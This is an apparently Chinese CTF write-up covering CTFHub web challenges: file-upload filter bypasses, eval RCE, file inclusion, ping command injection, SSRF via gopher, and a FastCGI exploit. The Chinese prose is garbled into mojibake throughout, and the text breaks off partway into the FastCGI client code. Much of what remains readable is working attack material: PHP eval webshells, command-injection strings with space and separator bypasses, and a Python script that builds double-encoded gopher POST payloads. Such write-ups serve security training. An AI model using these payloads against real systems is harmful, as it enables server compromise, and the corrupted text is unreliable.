é¢˜ç›®è¯´æ²¡æœ‰è¿‡æ»¤ï¼Œç›´æ¥ä¼ å…¥ä¸€å¥è¯ä¸Šä¼ å³å¯ï¼Œå¦‚ä¸‹å›¾ï¼Œæ–‡ä»¶ä¸Šä¼ è·¯å¾„ä¹Ÿå¾—çŸ¥äº†ï¼Œç›´æ¥è®¿é—®ã€‚ 1=system('cat /var/www/html/flag_1916225392.php'); å‰ç«¯éªŒè¯ è¿™é‡Œä¸Šä¼ phpåç¼€æ–‡ä»¶ä¼šå‘ç°è¢«å‰ç«¯çš„jsç¦æ­¢äº†ï¼Œé‚£æˆ‘ä»¬ä¿®æ”¹åç¼€ä¸ºå…¶æŒ‡å®šçš„ï¼ŒéšåæŠ“åŒ…ä¿®æ”¹å³å¯ æˆåŠŸä¸Šä¼  1=system('cat /var/www/html/flag_985418763.php'); .htaccess htaccessæ–‡ä»¶æ˜¯ApacheæœåŠ¡å™¨ä¸­çš„ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œå®ƒè´Ÿè´£ç›¸å…³ç›®å½•ä¸‹çš„ç½‘é¡µé…ç½®ã€‚é€šè¿‡htaccessæ–‡ä»¶ï¼Œå¯ä»¥å¸®æˆ‘ä»¬å®ç°ï¼šç½‘é¡µ301é‡å®šå‘ã€è‡ªå®šä¹‰404é”™è¯¯é¡µé¢ã€æ”¹å˜æ–‡ä»¶æ‰©å±•åã€å…è®¸/é˜»æ­¢ç‰¹å®šçš„ç”¨æˆ·æˆ–è€…ç›®å½•çš„è®¿é—®ã€ç¦æ­¢ç›®å½•åˆ—è¡¨ã€é…ç½®é»˜è®¤æ–‡æ¡£ç­‰åŠŸèƒ½ å¦‚æœæˆ‘ä»¬ç”¨ä¸Šä¸€å…³çš„æ€è·¯ä¼šå‘ç°è¡Œä¸é€šï¼Œå…¶åœ¨åç«¯è¿›è¡Œäº†åç¼€åçš„éªŒè¯ if (!empty($_POST['submit'])) { $name = basename($_FILES['file']['name']); $ext = pathinfo($name)['extension']; $blacklist = array(\"php\", \"php7\", \"php5\", \"php4\", \"php3\", \"phtml\", \"pht\", \"jsp\", \"jspa\", \"jspx\", \"jsw\", \"jsv\", \"jspf\", \"jtml\", \"asp\", \"aspx\", \"asa\", \"asax\", \"ascx\", \"ashx\", \"asmx\", \"cer\", \"swf\"); if (!in_array($ext, $blacklist)) { if (move_uploaded_file($_FILES['file']['tmp_name'], UPLOAD_PATH . $name)) { echo \"&lt;script&gt;alert('ä¸Šä¼ æˆåŠŸ')&lt;/script&gt;\"; echo \"ä¸Šä¼ æ–‡ä»¶ç›¸å¯¹è·¯å¾„&lt;br&gt;\" . UPLOAD_URL_PATH . $name; } else { echo \"&lt;script&gt;alert('ä¸Šä¼ å¤±è´¥')&lt;/script&gt;\"; } } else { echo \"&lt;script&gt;alert('æ–‡ä»¶ç±»å‹ä¸åŒ¹é…')&lt;/script&gt;\"; } } æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸Šè¿°è¿‡æ»¤çš„åç¼€å¾ˆå¤šï¼Œä½†æ˜¯æ²¡æœ‰è¿‡æ»¤.htaccessï¼Œé‚£æˆ‘ä»¬ä¸Šä¼ å³å¯ï¼Œå†…å®¹å¦‚ä¸‹ AddType application/x-httpd-php .bcx è¿™æ„å‘³ç€å¦‚æœæˆ‘ä»¬ä¸Šä¼ åç¼€åä¸º.bcxçš„æ–‡ä»¶ï¼Œå…¶æœåŠ¡å™¨ä¼šå°†å…¶å†…å®¹æŒ‰ç…§phpè§£æã€‚ 1=system('cat /var/www/html/flag_2427815270.php'); MIMEç»•è¿‡ è¿™é‡Œè¿›è¡Œäº†MIMEç±»å‹çš„æ£€æµ‹ æˆ‘ä»¬ç›´æ¥ä¿®æ”¹Content-Typeå³å¯ 1=system('cat /var/www/html/flag_324517797.php'); æ–‡ä»¶å¤´æ£€æŸ¥ è¿™é‡Œé™åˆ¶äº†æ–‡ä»¶å¤´ä¹Ÿå°±æ˜¯ä¸èƒ½&lt;?phpå¼€å¤´äº†ï¼Œé‚£æˆ‘ä»¬ä»¥GIF89aå¼€å¤´å³å¯ 1=system('cat /var/www/html/flag_31822842.php'); 00æˆªæ–­ è¿™é‡Œé¢˜ç›®è¯´æ˜¯åˆ©ç”¨00æˆªæ–­ï¼ŒåŸç†å°±æ˜¯ç©ºå­—ç¬¦åœ¨Cè¯­è¨€ä¸­ä¼šè¢«å½“åšå­—ç¬¦ä¸²ç»“æŸçš„æ ‡å¿—ï¼Œè€Œphpåº•å±‚æ˜¯Cå®ç°çš„ï¼Œé‚£ä¹Ÿå°±æ˜¯è¯´phpä¹Ÿå¯ä»¥ç”¨00æ¥ä»£è¡¨æˆªæ–­ï¼Œä¸è¿‡æ­¤æ–¹æ³•æœ‰PHPç‰ˆæœ¬é™åˆ¶ æˆ‘ä»¬éšä¾¿ä¸Šä¼ ä¸ªæ–‡ä»¶æŠ“åŒ…å¯ä»¥çœ‹åˆ°å¦‚ä¸‹å›¾ï¼Œè¿™é‡Œå¢åŠ äº†ä¸€ä¸ªå‚æ•°å¯¼è‡´æˆ‘ä»¬å¯ä»¥éšæ„æ§åˆ¶æ–‡ä»¶ä¸Šä¼ è·¯å¾„ï¼Œé‚£æˆ‘ä»¬ç›´æ¥åœ¨è·¯å¾„åé¢åšå‡ºå¦‚ä¸‹ä¿®æ”¹ è¿™é‡Œæ³¨æ„ç©ºå­—ç¬¦ç”¨%00ä»£æ›¿ï¼Œéšåç›´æ¥ä¸Šä¼ å³å¯ï¼Œè¿™é‡Œå¦‚æœæˆ‘ä»¬çš„æ–‡ä»¶åä¸º1.jpgä¹‹ç±»çš„ï¼Œé‚£ä¸Šä¼ åä¸ºshell.php%001.jpgè¿™é‡Œä¸Šä¼ è‡³æœåŠ¡å™¨ä¹‹åï¼Œå®ƒä¼šå°†åé¢çš„1.jpgå¿½ç•¥ï¼Œä»è€Œæˆ‘ä»¬å¯ä»¥ç»•è¿‡ã€‚ åŒå†™åç¼€ è¿™é‡Œä¸Šä¼ çœ‹äº†ä¸€ä¸‹å‘ç°åç¼€phpè¢«æ›¿æ¢ä¸ºç©ºäº†ï¼Œä½†ä¸‹é¢ç»™äº†æˆ‘ä»¬æç¤ºä»£ç  $name = basename($_FILES['file']['name']); $blacklist = array(\"php\", \"php5\", \"php4\", \"php3\", \"phtml\", \"pht\", \"jsp\", \"jspa\", \"jspx\", \"jsw\", \"jsv\", \"jspf\", \"jtml\", \"asp\", \"aspx\", \"asa\", \"asax\", \"ascx\", \"ashx\", \"asmx\", \"cer\", \"swf\", \"htaccess\", \"ini\"); $name = str_ireplace($blacklist, \"\", $name); è¿™é‡Œå°†é»‘åå•ä¸­çš„æ›¿æ¢ä¸ºç©ºï¼Œå’Œæ˜æ˜¾å¯ä»¥åŒå†™ç»•è¿‡ RCE eval()æ‰§è¡Œ &lt;?php if (isset($_REQUEST['cmd'])) { eval($_REQUEST[\"cmd\"]); } else { highlight_file(__FILE__); } ?&gt; æ²¡æœ‰ä»»ä½•è¿‡æ»¤ æœ€åcatè¯»å–å³å¯ æ–‡ä»¶åŒ…å« &lt;?php error_reporting(0); if (isset($_GET['file'])) { if (!strpos($_GET[\"file\"], \"flag\")) { include $_GET[\"file\"]; } else { echo \"Hacker!!!\"; } } else { highlight_file(__FILE__); } ?&gt; &lt;hr&gt; i have a &lt;a href=\"shell.txt\"&gt;shell&lt;/a&gt;, how to use it ? i have a shell, how to use it ? è¿™é‡Œé™åˆ¶äº†flagçš„å‡ºç°ï¼Œstrposæ˜¯ç”¨äºå¯»æ‰¾fileå‚æ•°ä¸­æ˜¯å¦å­˜åœ¨flagæ•æ„Ÿå­—ç¬¦ã€‚ é‚£æˆ‘ä»¬ä¼ å…¥ä¸€å¥è¯å³å¯ï¼Œè¿™é‡Œç”¨ä»–æä¾›çš„shell.txtäº†ï¼Œå› ä¸ºincludeä¼šæ‰§è¡Œä¼ å…¥çš„æ–‡ä»¶ä¸­çš„phpä»£ç  æœ€åè¯»å–å³å¯ php://input ä½¿ç”¨é¢˜ç›®æè¿°çš„phpä¼ªåè®®çš„å‰æå°±æ˜¯ï¼Œä¸‹é¢çš„includeé‚£ä¸ªå‚æ•°ä¸ºon æ¥ç€æˆ‘ä»¬æ„é€ payloadå³å¯ è¿œç¨‹åŒ…å« &lt;?php error_reporting(0); if (isset($_GET['file'])) { if (!strpos($_GET[\"file\"], \"flag\")) { include $_GET[\"file\"]; } else { echo \"Hacker!!!\"; } } else { highlight_file(__FILE__); } ?&gt; &lt;hr&gt; i don't have shell, how to get flag?&lt;br&gt; &lt;a href=\"phpinfo.php\"&gt;phpinfo&lt;/a&gt; i don't have shell, how to get flag? phpinfo æˆ‘ä»¬çœ‹åˆ°å€¼ä¸ºonå¯ä»¥è¿›è¡Œè¿œç¨‹æ–‡ä»¶åŒ…å«ï¼Œæˆ‘ä»¬ç›´æ¥å°†å…¶åŒ…å«æˆ‘ä»¬vpsä¸Šçš„æ¶æ„æ–‡ä»¶å³å¯æ³¨æ„æ¶æ„æ–‡ä»¶çš„åç¼€ä¸å¯ä¸ºphp æˆ–è€…é‡‡ç”¨ä¸Šä¸€å…³çš„php://inputä¹Ÿå¯ è¯»å–æºä»£ç  ç›´æ¥phpä¼ªåè®®è¯»å–å³å¯ å‘½ä»¤æ³¨å…¥ &lt;?php $res = FALSE; if (isset($_GET['ip']) &amp;&amp; $_GET['ip']) { $cmd = \"ping -c 4 {$_GET['ip']}\"; exec($cmd, $res); } ?&gt; &lt;?php if ($res) { print_r($res); } ?&gt; &lt;?php show_source(__FILE__); ?&gt; ip=127.0.0.1|ls ip=127.0.0.1|cat 3475247317307.php è¿‡æ»¤cat ?ip=127.0.0.1|tac flag_232592471929828.php|base64 è§£å¯†å³å¯ è¿‡æ»¤ç©ºæ ¼ ?ip=127.0.0.1|tac${IFS}flag_15920651517426.php &lt; ã€&lt;&gt;ã€%20(space)ã€%09(tab)ã€\\$IFS\\$9ã€ \\${IFS}ã€$IFS è¿‡æ»¤ç›®å½•åˆ†éš”ç¬¦ è¿™é‡Œçœ‹åˆ°é¢˜ç›®è¿‡æ»¤äº†/ç¬¦å·ï¼Œé™·å…¥çŸ¥è¯†ç›²åŒºäº†ï¼Œæƒ³ç€ç¼–ç å¯ä»¥ç»•è¿‡ï¼Œä½†æ²¡æœ‰æ•ˆæœï¼Œä¸çŸ¥é“ä¸ºä½•ã€‚çœ‹äº†wpå‘ç°ä¼¼ä¹æ˜¯è€ƒå¯Ÿå¯¹äºç®¡é“ç¬¦çš„ç†è§£çš„ï¼Œæˆ‘ä»¬å¯ä»¥é‡‡ç”¨;ç¬¦å· ;lså‘ç°flagæ‰€åœ¨ç›®å½• é‚£æ¥ä¸‹æ¥æˆ‘ä»¬è¿™æ ·æ„é€  ?ip=;cd flag_is_here;ls catè¯»å–å³å¯ è¿‡æ»¤è¿ç®—ç¬¦ è¿™é‡Œçœ‹ä»£ç è¿‡æ»¤äº†&amp;å’Œ/ç¬¦å·ï¼Œæˆ‘ä»¬ç›´æ¥ç”¨;å³å¯ ?ip=;cat flag_146781707832397.php ç»¼åˆè¿‡æ»¤ç»ƒä¹  &lt;?php $res = FALSE; if (isset($_GET['ip']) &amp;&amp; $_GET['ip']) { $ip = $_GET['ip']; $m = []; if (!preg_match_all(\"/(\\||&amp;|;| |\\/|cat|flag|ctfhub)/\", $ip, $m)) { $cmd = \"ping -c 4 {$ip}\"; exec($cmd, $res); } else { $res = $m; } } ?&gt; è¿™é‡Œè¿‡æ»¤äº†|ã€&amp;ã€;ã€\\ã€catã€flagã€ctfhubï¼Œè¿™é‡Œå¯ä»¥é‡‡ç”¨%0aæ¢è¡Œç¬¦æˆ–è€…%09Tabåˆ¶è¡¨ç¬¦ç»•è¿‡ åœ¨ Linux ä¸­ä½¿ç”¨ Tab é”®ï¼Œå¯ä»¥å®ç°å‘½ä»¤è¡¥å…¨ã€æ–‡ä»¶å’Œç›®å½•åè¡¥å…¨ç­‰ã€‚ ?ip=%0acd%09*here%0atac${IFS}fla''g_61041444712473.php SSRF å†…ç½‘è®¿é—® è¿™é‡Œç›´æ¥æŒ‰ç…§å¦‚ä¸Šè®¿é—®å³å¯å¾—åˆ° ä¼ªåè®®è¯»å–æ–‡ä»¶ é‡‡ç”¨fileä¼ªåè®®ç›´æ¥è¯»å–åˆ° ç«¯å£æ‰«æ è¿™é‡Œè¯´æ˜¯ç«¯å£æ‰«æä¸”èŒƒå›´åœ¨8000-9000ï¼Œé‚£æˆ‘ä»¬åˆ©ç”¨dictæˆ–è€…httpåè®®å³å¯ æˆ‘ä»¬æ„é€ å¦‚ä¸Špayloadå¯¹8000ä½ç½®è¿›è¡Œçˆ†ç ´å³å¯ å…±è®¡å®Œæˆåå‘ç°ä¸€ä¸ªé•¿åº¦æ˜æ˜¾ä¸åŒçš„ æœ€ååˆ©ç”¨httpåè®®è®¿é—®è¯¥ç«¯å£å‘ç°flag POSTè¯·æ±‚ è¿™æ¬¡æ˜¯å‘ä¸€ä¸ªHTTP POSTè¯·æ±‚.å¯¹äº†.ssrfæ˜¯ç”¨phpçš„curlå®ç°çš„.å¹¶ä¸”ä¼šè·Ÿè¸ª302è·³è½¬.åŠ æ²¹å§éªšå¹´ è¿™é¢˜åˆæ˜¯æˆ‘çš„çŸ¥è¯†ç›²åŒºï¼Œå°±è·Ÿç€wpèµ°äº†ï¼Œæ€è·¯å¦‚ä¸‹ã€‚ ä¸€èˆ¬é‡åˆ°è¿™ç§æ¼æ´æˆ‘ä»¬éœ€è¦å…ˆåˆ©ç”¨ç®€å•çš„fileã€httpã€dictåè®®è¿›è¡Œåˆæ­¥çš„åˆ¤æ–­ï¼Œæ¯”å¦‚ç«¯å£å¼€æ”¾æƒ…å†µï¼Œå…¶å†…ç½‘æ–‡ä»¶é‚£äº›å¯è¯»ç­‰ç­‰ã€‚é‚£è¿™é‡Œæˆ‘ä»¬å°±å…ˆçœ‹çœ‹èƒ½å¦è¯»å–åˆ°127.0.0.1é‡Œé¢çš„æ–‡ä»¶ ?url=file:///var/www/html/index.php &lt;?php error_reporting(0); if (!isset($_REQUEST['url'])){ header(\"Location: /?url=_\"); exit; } $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $_REQUEST['url']); curl_setopt($ch, CURLOPT_HEADER, 0); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); curl_exec($ch); curl_close($ch); ?&gt; å†è¯»flag.php &lt;?php error_reporting(0); if ($_SERVER[\"REMOTE_ADDR\"] != \"127.0.0.1\") { echo \"Just View From 127.0.0.1\"; return; } $flag=getenv(\"CTFHUB\"); $key = md5($flag); if (isset($_POST[\"key\"]) &amp;&amp; $_POST[\"key\"] == $key) { echo $flag; exit; } ?&gt; &lt;form action=\"/flag.php\" method=\"post\"&gt; &lt;input type=\"text\" name=\"key\"&gt; &lt;!-- Debug: key=&lt;?php echo $key;?&gt;--&gt; &lt;/form&gt; è¿™é‡Œè¯´åœ°å€åªèƒ½ä¸º127.0.0.1ä¸”å¦‚æœæˆ‘ä»¬ä¼ å…¥æ­£ç¡®çš„keyå³å¯è·å¾—flagï¼ˆä½†å¿…é¡»æ˜¯postä¼ å…¥keyï¼‰ï¼Œå¹¶ä¸”æç¤ºæˆ‘ä»¬è®¿é—®flag.phpå³å¯å¾—åˆ°keyï¼Œå¦‚ä¸‹å›¾ï¼škey=fd2d96bb2014fc2e6989fca7ece45856 æ¥ä¸‹æ¥å°±åº”è¯¥æƒ³ç€è°å¯ä»¥è¿›è¡Œpostä¼ å‚ï¼Œè¿™é‡Œçœ‹äº†wpçŸ¥é“æ˜¯gopheråè®®å¯ä»¥ gopherä¼ªåè®®ï¼ˆcurlæ”¯æŒgopherï¼‰ï¼Œå‘é€GETæˆ–POSTè¯·æ±‚(éœ€è¦é…åˆhttpåè®®äºŒæ¬¡urlç¼–ç ä¸Šä¼ )ï¼› æœ¬é¢˜è¦ç”¨gopherå‘é€POSTè¯·æ±‚ï¼Œgopherçš„æ ¼å¼æ˜¯gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_åæ¥tcpæµï¼Œæœ¬é¢˜é»˜è®¤ä¼ªgopher://127.0.0.1:80/_åæ¥postè¯·æ±‚ ï¼Œå®Œæ•´çš„gopherè¯·æ±‚å¦‚ä¸‹ï¼š POST /flag.php HTTP/1.1 Host: 127.0.0.1:80 Content-Type: application/x-www-form-urlencoded Content-Length: 36 key=fd2d96bb2014fc2e6989fca7ece45856 å…·ä½“åŸç†ä¸€ä¼šå„¿å†è¯´ï¼Œç„¶åæˆ‘ä»¬å°†å®ƒè¿›è¡Œurlç¼–ç ï¼Œè¿›è¡Œç¼–ç æ—¶è¦æ³¨æ„ï¼š é—®å·ï¼ˆï¼Ÿï¼‰éœ€è¦è½¬ç ä¸ºURLç¼–ç ï¼Œä¹Ÿå°±æ˜¯%3f(æœ¬é¢˜ä¸æ¶‰åŠè¿™ä¸ªé—®é¢˜) å›è½¦æ¢è¡Œè¦å˜ä¸º%0d%0aï¼Œä½†å¦‚æœç›´æ¥ç”¨å·¥å…·è½¬ï¼Œå¯èƒ½åªä¼šæœ‰%0a åœ¨HTTPåŒ…çš„æœ€åè¦åŠ %0d%0aï¼Œä»£è¡¨æ¶ˆæ¯ç»“æŸï¼ˆå…·ä½“å¯ç ”ç©¶HTTPåŒ…ç»“æŸï¼‰ import urllib.parse payload = \"\"\"POST /flag.php HTTP/1.1 Host: 127.0.0.1:80 Content-Type: application/x-www-form-urlencoded Content-Length: 36 key=b8241a456e991e16ea69f441fd0cb214 \"\"\" # æ³¨æ„payloadçš„æœ€åä¸€è¡Œæ˜¯å›è½¦ï¼ˆç©ºè¡Œï¼‰ï¼Œè¡¨ç¤ºhttpè¯·æ±‚ç»“æŸ tmp = urllib.parse.quote(payload) new = tmp.replace('%0A', '%0D%0A') new2 = urllib.parse.quote(new) result = 'gopher://127.0.0.1:80/_' + new2 print(result) # è¿™é‡Œå› ä¸ºæ˜¯GETè¯·æ±‚æ‰€ä»¥è¦è¿›è¡Œä¸¤æ¬¡urlç¼–ç  ä¹‹åbpå‘é€å³å¯ è¿™é‡Œåœ¨å¤ç°çš„æ—¶å€™é‡åˆ°çš„é—®é¢˜ä¹Ÿå¾ˆå¤šï¼Œåœ¨æ­¤æ¢³ç†ä¸€ä¸‹ ç¬¬ä¸€ä¸ªæ˜¯å…³äºgopheråè®®ç¼–ç å‡ æ¬¡çš„é—®é¢˜ï¼š è¿™é‡Œå¥½ç†è§£ä¸€ç‚¹å°±æ˜¯ï¼šæ¯”å¦‚æˆ‘ä»¬æƒ³è¦åˆ©ç”¨gopheråè®®æ”»å‡»ä¸€ä¸ªæœåŠ¡å™¨çš„å†…ç½‘ï¼Œå¹¶ä¸”è¯¥æœåŠ¡å™¨æŸå¤„å­˜åœ¨ä¸€ä¸ªssrfçš„æ¼æ´ï¼Œé‚£æˆ‘ä»¬è‚¯å®šè¦åœ¨æ­¤å¤„ä¼ å…¥æˆ‘ä»¬çš„gopheråè®®è¿›è¡Œæ‰“å‡»ï¼Œä½†åœ¨æ­¤ä¹‹å‰å‘¢ï¼Œè¯¥webç«¯å¯¹äºæˆ‘ä»¬ä¼ å…¥çš„å‚æ•°ï¼ˆä¹Ÿå°±æ˜¯gopheråè®®çš„å†…å®¹ï¼‰è¿›è¡Œäº†å¤šæ¬¡è¯·æ±‚ï¼ˆæˆ–è€…å«åšå¤„ç†ï¼‰ï¼Œä½†è¿™äº›è¯·æ±‚å¯¹æˆ‘ä»¬æ¥è¯´æ˜¯å¤šä½™ä¸å¿…è¦çš„ï¼Œæˆ‘ä»¬æƒ³è¦çš„æ˜¯æœ€åä¸€æ¬¡å¯ä»¥è¾¾åˆ°å¯¹å†…ç½‘æœåŠ¡çš„è¯·æ±‚ã€‚ ä½†å†æ¬¡ä¹‹å‰æœåŠ¡å™¨å¯¹è¯¥å‚æ•°å†…å®¹è¿›è¡Œäº†å¤šæ¬¡å¤„ç†ï¼šurlè§£ç ï¼Œè¿™å¯èƒ½ä¼šå¯¼è‡´æˆ‘ä»¬åœ¨æœ€ç»ˆæ”»å‡»ä¹‹å‰ï¼Œå…¶gopheråè®®é‡Œé¢çš„éƒ¨åˆ†å‚æ•°è¢«è§£æä¸ºæ— æ•ˆçš„å­—ç¬¦ä¹‹ç±»çš„å¯¼è‡´æˆ‘ä»¬çš„æ”»å‡»å¤±è´¥ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦è¿›è¡Œè¶³å¤Ÿæ¬¡æ•°çš„urlç¼–ç ï¼Œè®©å…¶ä¿è¯åœ¨æœ€åä¸€æ¬¡å¯¹å†…ç½‘æœåŠ¡è¯·æ±‚çš„æ—¶å€™åœ¨å¯¹æˆ‘ä»¬çš„gopherå†…å®¹è¿›è¡Œæœ€åä¸€æ¬¡urlè§£ç ã€‚â€“å¦‚æœç†è§£æœ‰è¯¯ï¼Œå‹¿å–·~~ é‚£æ¥ä¸‹æ¥è®©æˆ‘ä»¬å›é¡¾ä¸€ä¸‹ä¸Šè¿°ä»£ç ï¼Œåˆ†æä¸€ä¸‹éœ€è¦è¿›è¡Œå‡ æ¬¡ç¼–ç  &lt;?php error_reporting(0); if (!isset($_REQUEST['url'])){ header(\"Location: /?url=_\"); exit; } $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $_REQUEST['url']); curl_setopt($ch, CURLOPT_HEADER, 0); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); curl_exec($ch); curl_close($ch); ?&gt; è¿™é‡Œè¯´æ˜¯å¦‚æœurlå‚æ•°ä¸å­˜åœ¨åˆ™è¿›è¡Œ302è·³è½¬ï¼Œå¦‚æœå­˜åœ¨å‘¢ï¼Œåˆ™åœ¨æ­£å¸¸è¿›è¡Œcurlçš„httpè¯·æ±‚ï¼Œè€Œè¿™ä¸€å¤„ä»£ç ï¼š curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); - å¦‚æœHTTPå“åº”åŒ…å«â€œLocation:â€é‡å®šå‘ï¼Œé‚£ä¹ˆè¿™ä¸ªé€‰é¡¹å…è®¸cURLéµå¾ªè‡³æ–°çš„ä½ç½®(é‡å®šå‘)ã€‚ é‚£è¿™é‡ŒåŸºæœ¬æ˜ç¡®äº†ï¼Œé¦–å…ˆæˆ‘ä»¬åœ¨urlè¿›è¡Œgetä¼ å‚çš„æ—¶å€™å‘¢ï¼Œè¯¥webæœåŠ¡å™¨ä¼šè‡ªåŠ¨å¯¹å…¶ä¸­çš„å†…å®¹è¿›è¡Œä¸€æ¬¡ç¼–ç ï¼Œæ¥ç€åœ¨index.phpé¡µé¢å‘¢ï¼Œè¿›è¡Œäº†ä¸€æ¬¡curlçš„httpè¯·æ±‚ï¼ˆè€Œè¿™ä¸ªè¯·æ±‚æ˜¯æˆ‘ä»¬æƒ³è¦çš„ï¼‰è¿™ä¹Ÿå°±æ„å‘³ç€æˆ‘ä»¬éœ€è¦è¿›è¡Œä¸¤æ¬¡ç¼–ç ï¼Œ ä½†æˆ‘çœ‹äº†å‡ ç¯‡wpå‘ç°æœ‰çš„è¿˜è¿›è¡Œäº†3æ¬¡ç¼–ç ï¼Œè¿™é‡Œæˆ‘çŒœæµ‹å› ä¸ºä»–ä»¬åœ¨ä¼ å‚çš„æ—¶å€™é¦–å…ˆæ˜¯è¯·æ±‚çš„index.phpé¡µé¢ï¼Œä¹‹åå†è¯·æ±‚flag.phpï¼Œä½†å¦‚æœå…ˆè¯·æ±‚index.phpé¡µé¢å‘¢ï¼Œè¿™ä¸ªhttpå“åº”æ˜¯åŒ…å«locationé‡å®šå‘çš„ï¼Œè¿™é‡Œä¸curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);é…åˆä¼šè¿›è¡Œä¸€æ¬¡302é‡å®šå‘çš„è¯·æ±‚ï¼Œå› æ­¤ä¼šå¢åŠ ä¸€æ¬¡urlç¼–ç æ¬¡æ•°ã€‚ å¦‚æœæˆ‘ä»¬çš„è¯·æ±‚ç›´æ¥æ˜¯å¯¹flag.phpè¿›è¡Œçš„ï¼Œé‚£å°±åªéœ€è¦ä¸¤æ¬¡äº† ä¸Šä¼ æ–‡ä»¶ index.php &lt;?php error_reporting(0); if (!isset($_REQUEST['url'])) { header(\"Location: /?url=_\"); exit; } $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $_REQUEST['url']); curl_setopt($ch, CURLOPT_HEADER, 0); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); curl_exec($ch); curl_close($ch); ?&gt; flag.php &lt;?php error_reporting(0); if($_SERVER[\"REMOTE_ADDR\"] != \"127.0.0.1\"){ echo \"Just View From 127.0.0.1\"; return; } if(isset($_FILES[\"file\"]) &amp;&amp; $_FILES[\"file\"][\"size\"] &gt; 0){ echo getenv(\"CTFHUB\"); exit; } ?&gt; Upload Webshell &lt;form action=\"/flag.php\" method=\"post\" enctype=\"multipart/form-data\"&gt; &lt;input type=\"file\" name=\"file\"&gt; &lt;/form&gt; è¿™é‡Œæ£€æŸ¥æ˜¯å¦æœ‰ä¸€ä¸ªåä¸ºâ€œfileâ€çš„æ–‡ä»¶ä¸Šä¼ åˆ°äº†è„šæœ¬ï¼Œå¹¶ä¸”è¿™ä¸ªæ–‡ä»¶çš„å¤§å°å¤§äº0å­—èŠ‚ã€‚æ¢å¥è¯è¯´ï¼Œè„šæœ¬æœŸå¾…æ¥æ”¶åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ ã€‚ è¿™é‡Œä¹Ÿæ˜¯æ‡µé€¼äº†ï¼Œå¿˜è®°æ˜¯è€ƒå¯Ÿgopheråè®®äº†ï¼Œæˆ‘è¿˜ä»¥ä¸ºæœ‰ä»€ä¹ˆå…¶ä»–ä¼ªåè®®æœ‰å¯ä»¥ä¸Šä¼ æ–‡ä»¶ä¹‹ç±»çš„è¯·æ±‚å‘¢ï¼Œä½†å´å¿˜è®°äº†æœ¬è´¨éƒ½æ˜¯postè¯·æ±‚ã€‚ä¾æ—§ä½¿ç”¨gopherå³å¯ ä¸è¿‡è¿™é‡Œå¯¹æˆ‘æ¥è¯´ä¸çŸ¥é“å¦‚ä½•æ„é€ æ–‡ä»¶ä¸Šä¼ åŒ…ï¼Œå› æ­¤çœ‹äº†wpå‘ç°æç„¶å¤§æ‚Ÿï¼Œå¾ˆä½©æœ è¿™é‡Œæˆ‘ä»¬è®¿é—®æŒ‡å®šé¡µé¢ä¼šå‘ç°å¹¶æ²¡æœ‰æäº¤æŒ‰é’®ï¼Œä½†æˆ‘ä»¬å¯ä»¥ä¿®æ”¹å‰ç«¯ä»£ç æ·»åŠ å•Šï¼š æ¥ä¸‹æ¥æˆ‘ä»¬æŠ“ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„åŒ…å³å¯ POST /flag.php HTTP/1.1 Host: challenge-e7b452777f5f1a42.sandbox.ctfhub.com:10800 Content-Length: 306 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://challenge-e7b452777f5f1a42.sandbox.ctfhub.com:10800 Content-Type: multipart/form-data; boundary=----WebKitFormBoundary1KSttxB6ZH3HWz2e User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Referer: http://challenge-e7b452777f5f1a42.sandbox.ctfhub.com:10800/?url=127.0.0.1/flag.php Accept-Encoding: gzip, deflate, br Accept-Language: zh-CN,zh;q=0.9 Connection: close ------WebKitFormBoundary1KSttxB6ZH3HWz2e Content-Disposition: form-data; name=\"file\"; filename=\"shell.jpg\" Content-Type: image/jpeg &lt;?php @eval($_POST[1]);?&gt; ------WebKitFormBoundary1KSttxB6ZH3HWz2e Content-Disposition: form-data; name=\"hybcx\" æäº¤ ------WebKitFormBoundary1KSttxB6ZH3HWz2e-- ç”¨ä¸Šè¿°ä»‹ç»çš„pythonä»£ç å¯¹å…¶è¿›è¡ŒäºŒæ¬¡urlç¼–ç å³å¯ï¼Œå»ºè®®ä¸Šè¿°payloadçš„æœ€åä¸€è¡Œåˆ«å»æ‰ï¼Œè¿™ä»£è¡¨ç€httpè¯·æ±‚çš„ç»“æŸæ ‡å¿— FastCGIåè®® è¿™é“é¢˜æˆ‘çœ‹ç€çŸ¥è¯†é¢æŒºå¹¿çš„ï¼Œæ‰€ä»¥è¿™é‡Œå°±ç›´æ¥è·Ÿç€æ–‡ç« å¤ç°ï¼Œå…·ä½“çš„åŸç†æˆ‘å¦èµ·ä¸€ç¯‡æ–‡ç« ç»­å†™ è¿™é‡Œæˆ‘ä»¬åœ¨ç†è§£äº†åŸç†ä¹‹åç›´æ¥ä¸Šexp import socket import random import argparse import sys from io import BytesIO # Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client PY2 = True if sys.version_info.major == 2 else False def bchr(i): if PY2: return force_bytes(chr(i)) else: return bytes([i]) def bord(c): if isinstance(c, int): return c else: return ord(c) def force_bytes(s): if isinstance(s, bytes): return s else: return s.encode('utf-8', 'strict') def force_text(s): if issubclass(type(s), str): return s if isinstance(s, bytes): s = str(s, 'utf-8', 'strict') else: s = str(s) return s class FastCGIClient: \"\"\"A Fast-CGI Client for Python\"\"\" # private __FCGI_VERSION = 1 __FCGI_ROLE_RESPONDER = 1 __FCGI_ROLE_AUTHORIZER = 2 __FCGI_ROLE_FILTER = 3 __FCGI_TYPE_BEGIN = 1 __FCGI_TYPE_ABORT = 2 __FCGI_TYPE_END = 3 __FCGI_TYPE_PARAMS = 4 